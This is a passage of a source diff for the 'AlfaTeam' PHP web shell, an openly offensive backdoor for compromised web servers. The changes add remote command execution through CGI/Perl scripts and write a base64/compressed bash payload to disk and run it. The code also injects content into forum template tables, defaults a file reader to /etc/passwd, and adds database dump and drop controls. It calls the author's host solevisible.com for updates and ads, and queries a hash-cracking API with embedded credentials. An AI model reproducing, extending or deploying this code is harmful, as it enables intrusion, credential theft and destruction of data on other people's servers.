 $realpath = parse_url($saveval,PHP_URL_PATH);
 $res = false;
 $AlfaCurl = new AlfaCURL();
 if(extension_loaded('sockets') && function_exists('fsockopen') && $method == 'auto'){
 if($fsock = @fsockopen($realurl, 80, $errno, $errstr, 10)){
-@fputs($fsock, "GET $realpath/faq.php HTTP/1.1\r\n");
+@fputs($fsock, "GET $realpath.$faq_file HTTP/1.1\r\n");
 @fputs($fsock, "HOST: $realurl\r\n");
 @fputs($fsock, "Connection: close\r\n\r\n");
 $check = fgets($fsock);
 if(preg_match("/200 OK/i",$check)){
-$p1 = "UPDATE ".$_POST['alfa6']."template SET template ='".str_replace("'","\'",$savetoass)."' WHERE title ='faq'";
+$p1 = "UPDATE ".$_POST['alfa6']."template SET template ='".mysqli_real_escape_string($conn,$savetoass)."' WHERE title ='".$faq_name."'";
 $ka1= @mysqli_query($conn,$p1) or die(mysqli_error($conn));
 $res = true;
 }
 @fclose($fsock);
 }
 }elseif(function_exists('curl_version') && $method == 'auto'){
-$AlfaCurl->Send($realurl.$realpath."/faq.php");
-$p1 = "UPDATE ".$_POST['alfa6']."template SET template ='".str_replace("'","\'",$savetoass)."' WHERE title ='faq'";
+$AlfaCurl->Send($realurl.$realpath.$faq_file);
+$p1 = "UPDATE ".$_POST['alfa6']."template SET template ='".mysqli_real_escape_string($conn,$savetoass)."' WHERE title ='".$faq_name."'";
 $ka1= @mysqli_query($conn,$p1) or die(mysqli_error($conn));
 $res = true;
 }
@@ -2584,17 +2047,11 @@ if($res){
 $ff = 'http://'.$realurl.$realpath."/solevisible.php";
 output($ff);
 }else{
-$ff = 'http://'.$realurl.$realpath."/faq.php";
+$ff = 'http://'.$realurl.$realpath.$faq_file;
 $fff = 'http://'.$realurl.$realpath."/solevisible.php";
 echo "<center><p><font color=\"#FFFFFF\">First Open This Link => </font><a href='".$ff."' target='_blank'>".$ff."</a><br/><font color=\"#FFFFFF\">Second Open This Link => </font><a href='".$fff."' target='_blank'>".$fff."</a></center></p>";}}}
 echo '</div>';
 alfafooter();
-}
-function alfaupdatepath(){
-	if($_POST['path']!=''){
-		$_SESSION[__LAST_CWD__] = $_POST['path'];
-	}
-	echo($_SESSION[__LAST_CWD__]);
 }
 function alfacheckfiletype(){
 	$path = $_POST['path'];
@@ -2606,44 +2063,85 @@ function alfacheckfiletype(){
 	}
 }
 function alfacheckupdate(){
-	if(!isset($_COOKIE['alfa_checkupdate'])){
-		if(function_exists("curl_version")){
-			$update = new AlfaCURL();
-			$json = $update->Send("http://solevisible.com/update.json");
-			$json = @json_decode($json);
-			if($json){
-				if(__ALFA_VERSION__ != $json->version){
-					@setcookie("alfa_checkupdate", "1", time()+86400);
-					echo('<div class="update-holder"><div class="update-partner"><div class="update-content"><div onClick="document.getElementsByClassName(\'update-holder\')[0].style.display = \'none\';" class="update-close">X</div><a href="'.$json->url.'" target="_blank">'.$json->text.'<br> Version: '.$json->version.'</a></div></div></div>');
+	if($GLOBALS["DB_NAME"]["cgi_api"]){
+		if(!isset($_COOKIE["alfacgiapi_mode"])&&!isset($_COOKIE["alfacgiapi"])){
+			_alfa_cgicmd("whoami","perl",true);
+			if(strlen(alfaEx("whoami",false,true))>0){
+				__alfa_set_cookie("alfa_canruncmd", "true");
+			}
+		}
+	}
+	if(function_exists("curl_version")){
+		$update = new AlfaCURL();
+		$json = $update->Send("http://solevisible.com/update.json?ver=".__ALFA_VERSION__);
+		$json = @json_decode($json,true);
+		$data = array();
+		if($json){
+			if(!isset($_COOKIE['alfa_checkupdate']) && !empty($json["type"])){
+				if($json["type"] == "update"){
+					if(__ALFA_VERSION__ != $json['version'] || __ALFA_UPDATE__ != $json['version_number']){
+						@setcookie("alfa_checkupdate", "1", time()+86400);
+						$data["content"] = '<div class="update-holder">'.$json["content"].'</div>';
+					}
 				}
 			}
+			if(isset($json["ads"]) && !empty($json["ads"])){
+				$data["content"] .= $json["ads"];
+			}
+			if(isset($json["copyright"]) && !empty($json["copyright"])){
+				$data["copyright"] = $json["copyright"];
+			}
+			if(isset($json["solevisible"]) && !empty($json["solevisible"])){
+				$data["solevisible"] = $json["solevisible"];
+			}
+			if(isset($json["code_name"]) && !empty($json["code_name"])){
+				$data["code_name"] = $json["code_name"];
+				$data["version_number"] = __ALFA_VERSION__;
+			}
+			if(isset($json["market"]) && !empty($json["market"])){
+				$data["market"] = $json["market"];
+			}
+			echo @json_encode($data);
 		}
 	}
 }
 function alfaWriteTocgiapi($name, $source){
-	@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
+	$temp = "";
+	$not_api = array("basedir.alfa", "getdir.alfa", "getheader.alfa");
+	if(in_array($name, $not_api)){
+		$temp = ALFA_TEMPDIR;
+		if($temp){
+			@chdir($temp);
+		}
+	}else{
+		alfaCreateParentFolder();
+		@chdir($GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__);
+	}
 	@mkdir('alfacgiapi',0755);
 	__write_file("alfacgiapi/".$name, __get_resource($source));
 	@chmod("alfacgiapi/".$name, 0755);
+	return $temp;
 }
 function alfacheckcgi(){if(strlen(alfaEx("id",false,true,true))>0)echo("ok");else echo("no");}
 function alfaupdateheader(){
-	if(!isset($_SESSION["updateheader_data"])){
+	if(!isset($_COOKIE["updateheader_data"])){
 		$bash = "zZRdb9owFIavya849dIGJLK0vVyFNFTohERBgtFdQIRM4hAL40R2UkYp/312gPARqLqbaYnyIfs8x+85r+UvV04qhTOh3JGhMeg3nwbtWnnqecDUoz8+zPGMQBzGEBPBIF4mYcRBpJMlJFjA9I3GMNm+MAvwPXCFRR5OCMiU+pqqGI3ur067W280e/1aeTElCQQk8UJgS/4bGOUzCV6q0usZtojtORUiEhWDeGEENgFrhVJJgpShb8ORZxlBJIAC5WCuNqqH3931A/iRAepahNQLa2Y5+4JJK0ZpOIQrsN8AmdkgAteFmxvY5R8hk45Q1VK5q4YfcZKvjEbqdqsjD+3FID9acBZhn4iinoNS/62olOM5UXqQZZazf7AxvKu+JmB7d/bd/W3FyiDrEJJEUH9LyQTrWEDXKQzhegAuUtpu0RluKqI0PgNONfjjA9CP5phyqUE98dLq/RzU2+NG97ne6vRryFH7wnmlIkkxczbBqtlESGR06s/Nxvix23nahuki/a9exANkvNTbrXq/mWfAjGJJpKNneuMMVVOvWGwoNU4DUAbobponKrQRD5CEhBulbZT4OKq0K9As48UMrGansYoF5Ql0emsLTtEK7PqgLYQSYftljhpwYQ0mC3HvsPDAZseZjxKb+/79jfQ9VcgtyQGOHrFiegT7aguc2ANuRgTUyAWRgiC99XNDtm4Wx7deXrLogLvQt4OYsz07duP8isWUedB/7sOnXbgs9KT2w6CzxW/0fX6baH35ceGu1SnxBw==";
 		$realdir = addslashes(dirname($_SERVER["SCRIPT_FILENAME"]));
-		alfaWriteTocgiapi("getheader.alfa",$bash);
-		$data = alfaEx("cd '{$realdir}/alfacgiapi';sh getheader.alfa",false,true,true);
+		$tmp_path = alfaWriteTocgiapi("getheader.alfa",$bash);
+		$data = alfaEx("cd '{$tmp_path}/alfacgiapi';sh getheader.alfa",false,true,true);
 		if(@is_array(@json_decode($data,true))){
-			$_SESSION["updateheader_data"] = $data;
+			__alfa_set_cookie("updateheader_data", __ZW5jb2Rlcg($data));
 			echo $data;
 		}
 	}else{
-		echo $_SESSION["updateheader_data"];
+		echo __ZGVjb2Rlcg($_COOKIE["updateheader_data"]);
 	}
 }
 function alfassiShell(){
 alfahead();
 echo '<div class=header>';
+alfaCreateParentFolder();
+@chdir($GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__);
 @mkdir('alfa_shtml',0755);
 @chdir('alfa_shtml');
 alfacgihtaccess('shtml');
@@ -2738,7 +2236,7 @@ if(!empty($hash)){
 $hash_type = $_POST['alfa4'];
 $email = "solevisible@gmail.com";
 $code = "7b9fa79f92c3cd96";
-$target = "http://md5decrypt.net/Api/api.php?hash=".$hash."&hash_type=".$hash_type."&email=".$email."&code=".$code;
+$target = "https://md5decrypt.net/Api/api.php?hash=".$hash."&hash_type=".$hash_type."&email=".$email."&code=".$code;
 $resp = @file_get_contents($target);
 if($resp==''){
 $get = new AlfaCURL();
@@ -2768,7 +2266,7 @@ if($_POST['alfa3'] == '>>'){
 $hash = $_POST['alfa2'];
 if(!empty($hash)){
 $curl = new AlfaCURL();
-$resp = $curl->Send("http://md5decrypt.net/en/HashFinder/","post","hash={$hash}&crypt=Search");
+$resp = $curl->Send("https://md5decrypt.net/en/HashFinder/","post","hash={$hash}&crypt=Search");
 echo(__pre().'<center>');
 if(preg_match('#<fieldset class="trouve">(.*?)</fieldset>#',$resp,$s)){
 	echo('<font color="green">'.$s[1].'</font>');
@@ -2793,78 +2291,110 @@ echo "<table class='foot' width='100%' border='0' cellspacing='3' cellpadding='0
 </tr>
 <tr>
 <td colspan='2'><form onsubmit='g(\"FilesMan\",this.c.value,\"\");return false;'><span class='footer_text'>Change Dir : </span><br><input class='foottable' id='footer_cwd' type='text' name='c' value='".htmlspecialchars($GLOBALS['cwd'])."'> <input type='submit' value=' '></form></td>
-<td colspan='2'><form onsubmit=\"editor(this.file.value,'auto','','','','file');return false;\"><span><span class='footer_text'>Read File : </span></span><br><input class='foottable' type='text' name='file' value='/etc/passwd'> <input type='submit' value=' '></form></td>
+<td colspan='2'><form onsubmit=\"editor(this.file.value,'view','','','','file');return false;\"><span><span class='footer_text'>Read File : </span></span><br><input class='foottable' type='text' name='file' value='/etc/passwd'> <input type='submit' value=' '></form></td>
 </tr>
 <tr>
-<td colspan='4'><form onsubmit=\"g('proc',null,this.c.value);this.c.value='';return false;\"><span><span class='footer_text'>Execute :</span><br><input class='foottable' type='text' name='c' value=' '> <input type='submit' value=' '></form></td>
+<td colspan='4'><form style='margin-top: 10px;' onsubmit=\"return false;\" autocomplete='off'><span><span class='footer_text'>Execute :</span><br><button onClick='alfaOpenPhpTerminal();return false;' class='foottable alfa_custom_cmd_btn'><img style='width:28px;vertical-align: middle;' src='http://solevisible.com/icons/menu/terminal.svg'> Terminal</button><br></form></td>
 </tr>
 <tr>
 <td colspan='4'><form onsubmit='u(this);return false;' name='footer_form' method='post' ENCTYPE='multipart/form-data'>
 <input type='hidden' name='a' value='FilesMAn'>
 <input type='hidden' name='c' value='" . $GLOBALS['cwd'] ."'>
+<input type='hidden' name='ajax' value='true'>
 <input type='hidden' name='alfa1' value='uploadFile'>
 <input type='hidden' name='charset' value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
-<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);'></p><input type='submit' name='submit' value=' '></form><br><span class='copyright'>[ ./AlfaTeam &copy; 2012-".date('Y')." ]</span></td>
+<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ ./AlfaTeam &copy; 2012-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1KLty8LUqnqsXkM3Qkvy2Kpv4gLt7Ugcyo\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>solevisible[at]gmail.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/solevisible'>@solevisible</a></span></div></td>
 </tr>
 </table>
 </div>
-<div id='cgiloader'><div class='editor-wrapper'><div class='editor-header'><div class='editor-controller'><div class='editor-minimize' onClick='editorMinimize(\"cgiloader\");'></div><div onClick='editorClose(\"cgiloader\");' class='close-button'></div></div></div><div id='cgiframe' style='margin-left:14px;margin-right:30px;'></div></div></div>
-<div id='editor'><div class='editor-wrapper'><div class='editor-header'><div class='editor-path'></div><div class='editor-controller'><div class='editor-minimize' onClick='editorMinimize(\"editor\");'></div><div onClick='editorClose(\"editor\");' class='close-button'></div></div></div><div class='editor-explorer'><div class='hheader'><div class='history-clear' onclick='clearEditorHistory();'>Clear all</div><div class='hheader-text'>History</div><div class='editor-search'><input type='text' style='text-align:center;' id='search-input' placeholder='search'></div></div><div class='history-list'></div></div><div class='editor-modal'><div class='editor-body'><div class='editor-content'></div></div></div></div></div>
+
+<div id='options_window' style='background:rgba(0, 0, 0, 0.69);'><div class='editor-wrapper'><div class='editor-header'><div class='opt-title'></div><div class='editor-controller'><div class='editor-minimize' onClick='editorMinimize(\"options_window\");'></div><div onClick='editorClose(\"options_window\");' class='close-button'></div></div></div><div style='height:100%;' class='content_options_holder'><div class='options_tab'></div><div class='options_content' style='margin-left:14px;margin-right:30px;background:#000;overflow:auto;'></div></div></div></div>
+
+<div id='database_window' style='background:rgba(0, 0, 0, 0.69);'><div class='editor-wrapper'><div class='editor-header'><div class='opt-title'>Sql Manager</div><div class='editor-controller'><div class='editor-minimize' onClick='editorMinimize(\"database_window\");'></div><div onClick='editorClose(\"database_window\");' class='close-button'></div></div></div><div class='content_options_holder' style='margin-left:14px;margin-right:30px;background:#000;max-height:90%;'><div class='sql-tabs'></div><div class='sql-contents' style='max-height: 85vh;'></div></div></div></div>
+
+<div id='cgiloader'><div class='editor-wrapper'><div class='editor-header'><div class='opt-title'></div><div class='editor-controller'><div class='editor-minimize' onClick='editorMinimize(\"cgiloader\");'></div><div onClick='editorClose(\"cgiloader\");' class='close-button'></div></div></div><div id='cgiframe' style='position:relative;margin-left:14px;margin-right:30px;'><div class='terminal-tabs'></div><div style='height:90%;' class='terminal-contents'></div></div></div></div>
+<div id='editor' style='display:none;'><div class='editor-wrapper'><div class='editor-header'><div class='editor-path'></div><div class='editor-controller'><div class='editor-minimize' onClick='editorMinimize(\"editor\");'></div><div onClick='editorClose(\"editor\");' class='close-button'></div></div></div><div onclick='historyPanelController(this);' mode='visible' class='history-panel-controller'><<</div><div class='editor-explorer'><div class='hheader'><div class='history-clear' onclick='clearEditorHistory();'>Clear all</div><div class='hheader-text'>History</div><div class='editor-search'><input type='text' style='text-align:center;' id='search-input' placeholder='search'></div></div><div class='history-list'></div></div><div class='editor-modal'><div class='editor-body'><div class='editor-content'><div class='editor-tabs'></div><div class='editor-content-holder'></div></div></div></div></div></div>
 <div id='update-content'></div>
-<div id='editor-minimized' onclick='showEditor(\"editor\");'><div class='minimized-wrapper'><div class='minimized-text'>Show Editor</div></div></div>
-<div id='cgiloader-minimized' onclick='showEditor(\"cgiloader\");'><div class='minimized-wrapper'><div class='minimized-text'>Show Cgi</div></div></div>
+<div id='database_window-minimized' onclick='showEditor(\"database_window\");'><div class='minimized-wrapper'><span class='options_min_badge'>0</span><div class='minimized-text' style='top: 15px;'>Database</div></div></div>
+<div id='options_window-minimized' onclick='showEditor(\"options_window\");'><div class='minimized-wrapper'><span class='options_min_badge'>0</span><div style='top: 4px;' class='minimized-text'>Options</div></div></div>
+<div id='editor-minimized' onclick='showEditor(\"editor\");'><div class='minimized-wrapper'><span class='options_min_badge'>0</span><div style='top: 2px;' class='minimized-text'>Editor</div></div></div>
+<div id='cgiloader-minimized' onclick='showEditor(\"cgiloader\");'><div class='minimized-wrapper'><span class='options_min_badge'>0</span><div style='top: 12px;' class='minimized-text'>Cgi Shell</div></div></div>
+<div id='rightclick_menu'>
+  <a target='_blank' href='' name='newtab'><img src=\"http://solevisible.com/icons/menu/newtab.svg\"> Open in new tab</a>
+  <a target='_blank' href='' name='link'><img src=\"http://solevisible.com/icons/menu/link.svg\"> Open file directly</a>
+  <a href='javascript:void(0);' name='download'><img src=\"http://solevisible.com/icons/menu/download2.svg\"> Download</a>
+  <a href='' name='view'><img src=\"http://solevisible.com/icons/menu/view.svg\"> View</a>
+  <a href='javascript:void(0);' onclick='alfaSyncMenuToOpt(this);' path='' fname='' name='view_archive'><img src=\"http://solevisible.com/icons/menu/view.svg\"> View Archive</a>
+  <a href='' name='edit'><img src=\"http://solevisible.com/icons/menu/edit.svg\"> Edit</a>
+  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"move\");' ftype='' path='' fname='' href='' href='' name='move'><img src=\"http://solevisible.com/icons/menu/move.svg\"> Move</a>
+  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"copy\");' ftype='' path='' fname='' href='' name='copy'><img src=\"http://solevisible.com/icons/menu/copy.svg\"> Copy</a>
+  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"rename\");' ftype='' path='' fname='' name='rename'><img src=\"http://solevisible.com/icons/menu/rename.svg\">  Rename</a>
+  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"modify\");' ftype='' path='' fname='' name='modify'><img src=\"http://solevisible.com/icons/menu/time.svg\">  Modify</a>
+  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"permission\");' name='permission'><img src=\"http://solevisible.com/icons/menu/key.svg\"> Change Permissions</a>
+  <a href='javascript:void(0);' onclick='alfaSyncMenuToOpt(this);' path='' fname='' name='compress'><img src=\"http://solevisible.com/icons/menu/resize.svg\"> Compress</a>
+  <a href='javascript:void(0);' onclick='alfaSyncMenuToOpt(this);' path='' fname='' name='extract'><img src=\"http://solevisible.com/icons/menu/increase.svg\"> Extract</a>
+  <a href='javascript:void(0);' name='delete'><img src=\"http://solevisible.com/icons/menu/delete.svg\"> Delete</a>
+</div>
+<div id=\"filesman-tab-full-path\"></div>
+<div id='alert-area' class='alert-area'></div>
+<div class='cl-popup-fixed' style='display:none;'>
+	<div id='shortcutMenu-holder'>
+		<div class='popup-head'></div>
+			<form autocomplete='off' onSubmit='return false;'>
+				<label class='old-path-lbl'></label>
+				<div style='overflow: hidden;white-space: nowrap;text-overflow: ellipsis;' class='old-path-content'></div>
+				<label style='margin-top:10px;' class='new-filename-lbl'>New file name</label>
+				<input type='text' name='fname'>
+				<div class='perm-table-holder'>
+					<table>
+					   <tbody>
+					      <tr>
+					         <td><b>Mode</b></td>
+					         <td>User</td>
+					         <td>Group</td>
+					         <td>World</td>
+					      </tr>
+					      <tr>
+					         <td>Read</td>
+					         <td><input type='checkbox' name='ur' value='4' onclick='calcperm();'></td>
+					         <td><input type='checkbox' name='gr' value='4' onclick='calcperm();'></td>
+					         <td><input type='checkbox' name='wr' value='4' onclick='calcperm();'></td>
+					      </tr>
+					      <tr>
+					         <td>Write</td>
+					         <td><input type='checkbox' name='uw' value='2' onclick='calcperm();'></td>
+					         <td><input type='checkbox' name='gw' value='2' onclick='calcperm();'></td>
+					         <td><input type='checkbox' name='ww' value='2' onclick='calcperm();'></td>
+					      </tr>
+					      <tr>
+					         <td>Execute</td>
+					         <td><input type='checkbox' name='ux' value='1' onclick='calcperm();'></td>
+					         <td><input type='checkbox' name='gx' value='1' onclick='calcperm();'></td>
+					         <td><input type='checkbox' name='wx' value='1' onclick='calcperm();'></td>
+					      </tr>
+					      <tr>
+					         <td>Permission</td>
+					         <td><input style='width:60px;' type='text' name='u' maxlength='1' oninput='this.value=this.value.replace(/[^0-7]/g,0);autoCheckPerms(this.value, \"u\", [\"u\"]);'></td>
+					         <td><input style='width:60px;' type='text' name='g' maxlength='1' oninput='this.value=this.value.replace(/[^0-7]/g,0);autoCheckPerms(this.value, \"g\", [\"g\"]);'></td>
+					         <td><input style='width:60px;' type='text' name='w' maxlength='1' oninput='this.value=this.value.replace(/[^0-7]/g,0);autoCheckPerms(this.value, \"w\", [\"w\"]);'></td>
+					      </tr>
+					   </tbody>
+					</table>
+				</div>
+
+			</form>
+		<div class='popup-foot'>
+			<button style='background: #2b5225;' name='accept' action='' onclick='alfaPopUpDoAction(this);'></button>
+			<button style='background: #9e2c2c;' onclick='d.querySelector(\".cl-popup-fixed\").style.display=\"none\";'>Cancell</button>
+		</div>
+	</div>
+</div>";?>
 <script>
-	$('search-input').addEventListener('keydown', function(e){
-		setTimeout(function(){
-			var string = $('search-input').value
-			d.getElementsByClassName('history-list')[0].innerHTML = '';
-			for(var i in editor_files){
-				if(editor_files[i].file.search(string) != -1 || string == ''){
-					var mode = 0;
-					if(i == editor_current_file){
-						mode = ' is_active';
-					}
-					insertToHistory(i, editor_files[i].file, mode, editor_files[i].type);
-				}
-			}
-		}, 100);
-	},false);
-	_Ajax(d.URL, 'a='+alfab64('checkupdate'), function(res){
-		d.body.insertAdjacentHTML('beforeend', res);
-	});
-	if(".$GLOBALS["need_to_update_header"]."){
-		_Ajax(d.URL, 'a='+alfab64('updateheader'), function(res){
-			try{
-				var data = JSON.parse(res);
-				console.log(data);
-				for(var i in data){
-					var html = '';
-					for(var b = 0; b < data[i].length; b++){
-						if(i=='useful'||i=='downloader'){
-							html += '<span class=\"header_values\" style=\"margin-left: 4px;\">'+data[i][b]+'</span>';
-						}else{
-							html += data[i][b];
-						}
-					}
-					var elem = $('header_'+i);
-					if(elem){elem.innerHTML = html;}
-				}
-				$('header_cgishell').innerHTML = 'ON';
-				$('header_cgishell').setAttribute('class', 'header_on');
-			}catch(e){console.log(e)}
-		});
-	}else if(islinux){
-		_Ajax(d.URL, 'a='+alfab64('checkcgi'), function(res){
-			if(res=='ok'){
-				$('header_cgishell').innerHTML = 'ON';
-				$('header_cgishell').setAttribute('class', 'header_on');
-			}
-		});
-	}
+function alfaMysqlApi(e,t){var a={host:mysql_cache[e.db_id].host,user:mysql_cache[e.db_id].user,pass:mysql_cache[e.db_id].pass,db:e.db_target,db_id:e.db_id};if(e.hasOwnProperty("db_info"))for(var i in e.db_info)a[i]=e.db_info[i];var l={a:alfab64("Sql_manager_api"),c_:alfab64(c_),alfa1:alfab64(JSON.stringify(a))};if(e.hasOwnProperty("post"))for(var i in e.post.hasOwnProperty("alfa2")&&"load_data"!=e.post.alfa2&&"page"!=e.post.alfa2&&"edit"!=e.post.alfa2&&"delete"!=e.post.alfa2&&(d.querySelector("#"+e.db_id+" .mysql-query-result-header .mysql-query-pager").innerHTML="",d.querySelector("#"+e.db_id+" .mysql-query-result-header .mysql-query-reporter").innerHTML=""),e.post)l[i]=alfab64(e.post[i]);var r="";for(var o in l)r+=o+"="+l[o]+"&";alfaloader(e.db_id,"block"),_Ajax(d.URL,r,function(a){alfaloader(e.db_id,"none"),t(a)},!0,e.db_id)}function alfaMysqlFilterTable(e,t){setTimeout(function(){var a="",i="",l=(a="","");if(null!=e)a=e.getAttribute("target"),i=e.getAttribute("db_id"),l=e.value;else a=t.target,i=t.db_id,l=t.value;l=new RegExp(l,"i"),d.querySelectorAll("#"+i+" "+a+" ul > li").forEach(function(e){var t=e.querySelector(".mysql_tables");if(null==t)return!1;-1==(t=t.innerText).search(l)?e.style.display="none":e.style.display="block"})},200)}function alfaMysqlFilterAllTable(e,t){var a=e.getAttribute("db_id"),i=d.querySelector("#"+a+" .mysql-tables input[name=filter_all]").value,l=d.querySelector("#"+a+" input[name=sql_count]").checked,r=[],o=[];if(d.querySelectorAll("#"+a+" .mysql-tables .list_container").forEach(function(e){var t=e.getAttribute("mode"),a=e.getAttribute("db_name");"no"==t&&r.push(a),o.push(a)}),r.length>0){if(0==i.length&&void 0===t)return!1;alfaMysqlApi({db_id:a,db_target:r[0],ajax_id:"mysql_get_all_tables",db_info:{databases:r},post:{alfa2:"load_all_tables",alfa3:l}},function(r){if(0!=r.length){for(var o in r=JSON.parse(r)){var n=o,s=d.querySelector("#"+a+" .cls-"+n);alfaMysqlMakeTblList(r[o],s,a,n,l)}void 0===t?alfaMysqlFilterTable(null,{db_id:a,target:".mysql-tables .list_container",value:i}):(e.setAttribute("mode","opened"),d.querySelector("#"+a+" .mysql-tables .parent-expander img").src="http://solevisible.com/icons/menu/b_minus.png")}})}else if(void 0===t)for(var n in alfaMysqlFilterTable(null,{db_id:a,target:".mysql-tables .list_container",value:i}),o)alfaMysqlTableMode(a,o[n],"closed");else{var s="",c=e.getAttribute("mode");for(var n in"opened"==c?(e.setAttribute("mode","closed"),s="b_plus.png"):(e.setAttribute("mode","opened"),s="b_minus.png"),o)alfaMysqlTableMode(a,o[n],c);d.querySelector("#"+a+" .mysql-tables .parent-expander img").src="http://solevisible.com/icons/menu/"+s}}function alfaMysqlTableMode(e,t,a){var i=d.querySelector("#"+e+" .cls-"+t),l="";void 0===a?(l=-1!=i.classList.value.indexOf("hide-db-tables")?"b_minus.png":"b_plus.png",i.classList.toggle("hide-db-tables")):"opened"==a?(l="b_plus.png",i.classList.add("hide-db-tables")):(l="b_minus.png",i.classList.remove("hide-db-tables")),d.querySelector("#"+e+" .cls-"+t+"-expander img").src="http://solevisible.com/icons/menu/"+l}function alfaMysqlExpander(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=e.getAttribute("sql_count"),l=d.querySelector("#"+a+" .cls-"+t);"loaded"==l.getAttribute("mode")?alfaMysqlTableMode(a,t):alfaMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_get_tables",post:{alfa2:"load_tables",alfa3:i}},function(e){0!=e.length&&alfaMysqlMakeTblList(e=JSON.parse(e),l,a,t,i)})}function alfaMysqlTablesEvil(e){var t=e.getAttribute("target"),a=e.getAttribute("db_id"),i=e.getAttribute("mode");"checked"==i?(i=!1,e.setAttribute("mode","not")):(i=!0,e.setAttribute("mode","checked")),d.querySelectorAll("#"+a+" "+t+" input[name=tbl\\[\\]]").forEach(function(e){e.checked=i})}function alfaMysqlTablesDumpDrop(e){var t=e.getAttribute("target"),a=e.getAttribute("db_id"),i="none";"dump"==e.value&&(i="block"),d.querySelector("#"+a+" "+t+" .dump-file-holder").style.display=i}function alfaMysqlTablesDumpDropBtn(e){var t=e.getAttribute("target"),a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=[],r=d.querySelector("#"+i+" input[name=sql_count]").checked,o=d.querySelector("#"+i+" "+t),n=o.querySelector("select[name=tables_evil]").value,s=o.querySelector(".dump-file-holder input").value;d.querySelectorAll("#"+i+" "+t+" input[name=tbl\\[\\]]").forEach(function(e){e.checked&&l.push(e.value)}),l.length>0&&alfaMysqlApi({db_id:i,db_target:a,ajax_id:"mysql_query_evil",db_info:{tables:l,mode:n,dump_file:s},post:{alfa2:"dump_drop"}},function(e){0!=e.length&&(e=JSON.parse(e),"drop"==n?alfaMysqlMakeTblList(e,o,i,a,r):o.querySelector(".dump-file-holder").insertAdjacentHTML("beforeend","<div><a href='javascript:void(0);' onclick='g(\"FilesTools\",null,\""+s+'","download");\'><span>Download: '+s+"</span></a></div>"))})}function alfaMysqlMakeTblList(e,t,a,i,l){t.setAttribute("mode","loaded");var r='<ul><li><div class="block"><i></i><b></b></div><div><input style="padding: 0;margin-left: 11px;text-align:center;" type="text" class="db-opt-id" db_id="'+a+'" placeholder="Filter Table" target=".cls-'+i+'" onkeyup="alfaMysqlFilterTable(this);" name="filter"></div></li>';for(var o in e)null!=e[o]&&(r+="<li><div class='block'><i></i><b></b></div><div class='tables-row'><input type='checkbox' name='tbl[]' value='"+e[o].name+"'>&nbsp;<a class='db-opt-id' db_target='"+i+"' db_id='"+a+"' href='javascript:void(0);' onclick=\"alfaLoadTableData(this, '"+e[o].name+"')\"><span class='mysql_tables' style='font-weight:unset;'>"+e[o].name+"</span></a>"+(l?" <small><span style='font-weight:unset;' class='mysql_table_count'>("+e[o].count+")</span></small>":"&nbsp;")+"</div></li>");r+='</ul><div style="margin-left: 26px;margin-bottom: 10px;margin-top: 10px;"><input onchange="alfaMysqlTablesEvil(this);" db_id="'+a+'" class="db-opt-id" target=".cls-'+i+'" type="checkbox" class="db-opt-id"><select onchange="alfaMysqlTablesDumpDrop(this);" class="db-opt-id" db_id="'+a+'" target=".cls-'+i+'" class="db-opt-id" name="tables_evil" style="padding: 0;width: 100px;"><option selected>drop</option><option>dump</option></select> <button onclick="alfaMysqlTablesDumpDropBtn(this);return false;" db_id="'+a+'" class="db-opt-id" db_target="'+i+'" target=".cls-'+i+'" class="db-opt-id">Do it</button><div class="dump-file-holder" style="display:none;margin-left:20px;margin-top: 5px;"><input style="padding: 0;text-align:center;" type="text" placeholder="dump.sql" name="dump_file"></div></div>',t.innerHTML=r,d.querySelector("#"+a+" .cls-"+i+"-expander img").src="http://solevisible.com/icons/menu/b_minus.png"}function alfaMysqlQuery(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a+" textarea[name=query]").value;alfaMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_load_query_data",db_info:{query:i},post:{alfa2:"query"}},function(e){0!=e.length&&(e=JSON.parse(e),alfaMysqlReportBuilder(a,e),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.status?e.table:"",alfaMysqlTabCtl({child:1,db_id:a,target:".mysql-query-result-content"},!0))})}function alfaMysqlReportBuilder(e,t){var a="";t.status||(a="<div><span>Error: </span><div style='padding-left: 50px;'><pre>"+t.error+"</pre></div></div>");var i="<div><span>Query:</span><div style='padding-left: 50px;'><pre>"+t.query+"</pre></div>"+a+"</div>";d.querySelector("#"+e+" .mysql-query-reporter").innerHTML=i}function alfaMysqlTablePanelCtl(e){var 